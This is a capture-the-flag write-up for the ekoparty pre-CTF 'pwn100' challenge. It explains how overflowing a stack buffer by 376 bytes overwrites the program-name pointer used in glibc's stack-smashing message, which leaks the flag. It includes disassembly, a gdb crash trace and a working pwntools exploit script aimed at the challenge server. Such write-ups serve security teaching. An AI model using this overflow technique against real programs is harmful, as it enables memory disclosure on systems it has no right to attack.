## ekoparty_pre-ctf: pwn100

----------
## Challenge details
| Contest        | Challenge     | Category  | Points |
|:---------------|:--------------|:----------|-------:|
| ekoparty_pre-ctf | Smashing the stack for fun and profit | Pwn | 100  |



*Description*

> nc challs.ctf.site 20001

> Attachment: pwn100.zip 

----------
## Write-up

This binary loads the flag and then shows us the memory adress where it is loaded:

```asm
mov     rdx, [rbp+var_118]
lea     rax, [rbp+var_110]
mov     esi, 20h
mov     rdi, rax
call    fgets
mov     rax, [rbp+var_118]
mov     rdi, rax
call    fclose
lea     rax, [rbp+var_110]
mov     rsi, rax
mov     edi, offset aInterestingDat ; "Interesting data loaded at %p\nYour use"...
```

It continues to read in 1024 bytes in a 0x90 byte buffer:

```asm
mov     eax, 0
call    printf
mov     edi, 0
call    fflush
lea     rax, [rbp+var_90]
mov     edx, 1024
mov     rsi, rax
mov     edi, 0
call    read
jmp     short loc_401121
```

Unfortunately stack cookies are enabled:

```asm
mov     eax, 0
mov     rcx, [rbp+var_8]
xor     rcx, fs:28h
jz      short locret_40113A
call    __stack_chk_fail
```
We have some interesting behaviour for input of different lengths though:

```
$ ./xpl <<< $(python -c 'print "A"*0x90')
Interesting data loaded at 0x7ffd81ac9b40
Your username? *** stack smashing detected ***: ./xpl terminated
Aborted
```

```
./xpl <<< $(python -c 'print "A"*0x400')
Interesting data loaded at 0x7ffe4297eb90
Your username? Segmentation fault
```

What it turns out that is happening is that the stack-smashing protection is trying to print the name of the program when it exits, but our overflow is big enough that we can control the pointer to this string!

Lets see where it happens:

```
gdb -q xpl
Reading symbols from xpl...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: xpl 
Interesting data loaded at 0x7fffffffded0
Your username? AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%oA%TA%pA%UA%qA%VA%rA%WA%sA%XA%tA%YA%uA%ZA%vA%wA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsnAsSAsoAsTAspAsUAsqAsVAsrAsWAssAsXAstAsYAsuAsZAsvAswAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABnABSABoABTABpABUABqABVABrABWABsABXABtABYABuABZABvABwABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$nA$SA$oA$TA$pA$UA$qA$VA$rA$WA$sA$XA$tA$YA$uA$ZA$v

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x2541572541722541 ('A%rA%WA%')
RBX: 0x497f21 ("%s terminated\n")
RCX: 0x541 
RDX: 0x20 (' ')
RSI: 0x10 
RDI: 0x2541572541722541 ('A%rA%WA%')
RBP: 0x7fffffffde70 --> 0x497ef7 ("stack smashing detected")
RSP: 0x7fffffffdd48 --> 0x409941 (<__libc_message+305>:	mov    rcx,rax)
RIP: 0x41a0fa (<strlen+42>:	movdqu xmm12,XMMWORD PTR [rax])
R8 : 0x10 
R9 : 0x0 
R10: 0x41b3b0 (<strncmp+3840>:	pxor   xmm0,xmm0)
R11: 0x0 
R12: 0x2541572541722541 ('A%rA%WA%')
R13: 0x7fffffffdd50 --> 0x497f1b (" ***: %s terminated\n")
R14: 0x3 
R15: 0x3
EFLAGS: 0x10297 (CARRY PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x41a0ea <strlen+26>:	and    rcx,0xfff
   0x41a0f1 <strlen+33>:	cmp    rcx,0xfcf
   0x41a0f8 <strlen+40>:	ja     0x41a160 <strlen+144>
=> 0x41a0fa <strlen+42>:	movdqu xmm12,XMMWORD PTR [rax]
   0x41a0ff <strlen+47>:	pcmpeqb xmm12,xmm8
   0x41a104 <strlen+52>:	pmovmskb edx,xmm12
   0x41a109 <strlen+57>:	test   edx,edx
   0x41a10b <strlen+59>:	je     0x41a111 <strlen+65>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd48 --> 0x409941 (<__libc_message+305>:	mov    rcx,rax)
0008| 0x7fffffffdd50 --> 0x497f1b (" ***: %s terminated\n")
0016| 0x7fffffffdd58 --> 0x6 
0024| 0x7fffffffdd60 --> 0x7fffffffdd80 --> 0x497ef7 ("stack smashing detected")
0032| 0x7fffffffdd68 --> 0x1000 
0040| 0x7fffffffdd70 --> 0x8 
0048| 0x7fffffffdd78 --> 0x4098be (<__libc_message+174>:	movzx  edx,BYTE PTR [rax])
0056| 0x7fffffffdd80 --> 0x497ef7 ("stack smashing detected")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000000000041a0fa in strlen ()
gdb-peda$ pattern_offset $eax
1097999681 found at offset: 376
```

So the plan is to overflow with 376 bytes of garbage, and then the address to the flag:

```python
#!/usr/bin/python

from pwn import *

host = "challs.ctf.site"
port = 20001

s = remote(host, port)

r1 = s.recvuntil("username?")
adress = p64(int(r1.split()[4], 16))
s.send("A"*376 + adress)
print s.recvline()
```

Which gives: 

```
./smash.py 
[+] Opening connection to challs.ctf.site on port 20001: Done
 *** stack smashing detected ***: EKO{pwning_stack_protector}

[*] Closed connection to challs.ctf.site port 20001
```

The flag is:

```
EKO{pwning_stack_protector}
```
